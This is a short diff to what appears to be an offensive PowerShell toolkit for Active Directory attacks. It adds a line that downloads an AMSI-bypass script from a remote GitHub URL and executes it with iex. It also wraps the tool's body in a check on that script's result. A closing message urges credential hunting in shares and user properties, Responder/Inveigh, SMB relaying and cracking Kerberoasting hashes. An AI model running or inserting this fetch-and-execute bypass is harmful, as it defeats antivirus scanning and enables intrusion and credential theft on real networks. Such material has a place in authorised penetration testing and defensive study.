@@ -1,4 +1,7 @@
 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1')
+$string = iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1')
+if($string -eq $true) {
+
 
 #Zipping Function
 Add-Type -AssemblyName System.IO.Compression.FileSystem
@@ -1387,4 +1390,5 @@ __        ___       ____
     #End
     Write-Host -ForegroundColor Yellow 'Didnt get Domadm? Check the found Files/Shares for sensitive Data/Credentials. Check the Property field of AD-Users for Passwords. Network Shares and Passwords in them can lead to success! Try Responder/Inveigh and SMB-Relaying! ADIDNS is a good addition for the whole network. Crack Kerberoasting Hashes.'
     
+}
 }
